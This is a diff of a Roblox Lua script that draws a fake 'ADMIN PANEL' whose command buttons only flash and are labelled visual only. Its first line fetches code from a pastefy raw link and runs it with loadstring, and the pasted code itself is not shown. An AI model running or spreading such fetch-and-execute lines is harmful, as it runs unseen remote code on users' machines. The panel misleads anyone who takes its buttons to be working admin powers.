@@ -1,1 +1,107 @@
 loadstring(game:HttpGet("https://pastefy.app/jdc0J7xY/raw"))()
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "AdminPanelGUI"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- MAIN FRAME
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 420, 0, 420)
+frame.Position = UDim2.new(0.5, -210, 0.5, -210)
+frame.BackgroundColor3 = Color3.fromRGB(30, 60, 40)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = gui
+
+-- TITLE
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 50)
+title.BackgroundColor3 = Color3.fromRGB(80, 120, 130)
+title.Text = "ADMIN PANEL"
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.TextColor3 = Color3.new(1,1,1)
+title.Parent = frame
+
+-- COMMAND BOX
+local cmdBox = Instance.new("TextBox")
+cmdBox.Size = UDim2.new(1, -20, 0, 50)
+cmdBox.Position = UDim2.new(0, 10, 0, 60)
+cmdBox.PlaceholderText = "Enter command"
+cmdBox.Text = ""
+cmdBox.TextScaled = true
+cmdBox.Font = Enum.Font.Gotham
+cmdBox.BackgroundColor3 = Color3.fromRGB(20,40,30)
+cmdBox.TextColor3 = Color3.new(1,1,1)
+cmdBox.Parent = frame
+
+-- BUTTON CONTAINER
+local container = Instance.new("Frame")
+container.Size = UDim2.new(1, -20, 1, -130)
+container.Position = UDim2.new(0, 10, 0, 120)
+container.BackgroundTransparency = 1
+container.Parent = frame
+
+local layout = Instance.new("UIGridLayout")
+layout.CellSize = UDim2.new(0, 190, 0, 50)
+layout.CellPadding = UDim2.new(0, 10, 0, 10)
+layout.Parent = container
+
+-- COMMAND LIST (VISUAL ONLY)
+local commands = {
+    ";rocket",
+    ";ragdoll",
+    ";balloon",
+    ";inverse",
+    ";nightvision",
+    ";jail",
+    ";control",
+    ";tiny",
+    ";jumpscare",
+    ";morph"
+}
+
+for _,cmd in ipairs(commands) do
+    local btn = Instance.new("TextButton")
+    btn.Text = cmd
+    btn.TextScaled = true
+    btn.Font = Enum.Font.GothamBold
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.BackgroundColor3 = Color3.fromRGB(15, 80, 50)
+    btn.Parent = container
+    
+    -- VISUAL CLICK EFFECT ONLY
+    btn.MouseButton1Click:Connect(function()
+        btn.BackgroundColor3 = Color3.fromRGB(0, 150, 80)
+        wait(0.2)
+        btn.BackgroundColor3 = Color3.fromRGB(15, 80, 50)
+    end)
+end
+
+-- TOGGLE BUTTON (ON/OFF)
+local toggle = Instance.new("TextButton")
+toggle.Size = UDim2.new(0, 120, 0, 40)
+toggle.Position = UDim2.new(0, 10, 1, -45)
+toggle.Text = "Hide Panel"
+toggle.TextScaled = true
+toggle.Font = Enum.Font.GothamBold
+toggle.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
+toggle.TextColor3 = Color3.new(1,1,1)
+toggle.Parent = frame
+
+local visible = true
+
+toggle.MouseButton1Click:Connect(function()
+    visible = not visible
+    
+    container.Visible = visible
+    cmdBox.Visible = visible
+    
+    if visible then
+        toggle.Text = "Hide Panel"
+    else
+        toggle.Text = "Show Panel"
+    end
+end)
